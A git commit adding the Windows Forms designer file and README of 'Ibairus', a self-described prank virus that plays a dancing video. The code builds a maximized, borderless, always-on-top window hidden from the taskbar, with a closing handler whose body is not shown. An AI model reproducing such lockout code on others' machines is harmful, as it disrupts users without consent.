575a3a72b3a81db934c84313c7d6350e6430a356
Nashiito <84184848+Nashiito3@users.noreply.github.com>
2022-03-11 01:29:53 +0100

    Add files via upload

---
+++ Ibairus/Form1.Designer.cs
@@ -0,0 +1,75 @@
+﻿namespace Ibai_Virus
+{
+    partial class Ibai_Virus
+    {
+        /// <summary>
+        /// Variable del diseñador necesaria.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Limpiar los recursos que se estén usando.
+        /// </summary>
+        /// <param name="disposing">true si los recursos administrados se deben desechar; false en caso contrario.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Código generado por el Diseñador de Windows Forms
+
+        /// <summary>
+        /// Método necesario para admitir el Diseñador. No se puede modificar
+        /// el contenido de este método con el editor de código.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Ibai_Virus));
+            this.Player1 = new AxWMPLib.AxWindowsMediaPlayer();
+            ((System.ComponentModel.ISupportInitialize)(this.Player1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // Player1
+            // 
+            this.Player1.Enabled = true;
+            this.Player1.Location = new System.Drawing.Point(12, -2);
+            this.Player1.Name = "Player1";
+            this.Player1.OcxState = ((System.Windows.Forms.AxHost.State)(resources.GetObject("Player1.OcxState")));
+            this.Player1.Size = new System.Drawing.Size(800, 450);
+            this.Player1.TabIndex = 0;
+            this.Player1.TabStop = false;
+            // 
+            // Ibai_Virus
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.Black;
+            this.ClientSize = new System.Drawing.Size(800, 450);
+            this.ControlBox = false;
+            this.Controls.Add(this.Player1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Ibai_Virus";
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Ibai";
+            this.TopMost = true;
+            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Ibai_Virus_FormClosing);
+            ((System.ComponentModel.ISupportInitialize)(this.Player1)).EndInit();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private AxWMPLib.AxWindowsMediaPlayer Player1;
+    }
+}
+
---
+++ README.md
@@ -0,0 +1,10 @@
+# Ibairus
+Virus for breaking Windows. 
+
+# Intallation
+
+Just compile the project and enjoy
+
+# What is it?
+
+It's a virus based on Ibai, I don't know why I coded this. It just plays a video of ibai dancing and ur PC XD.
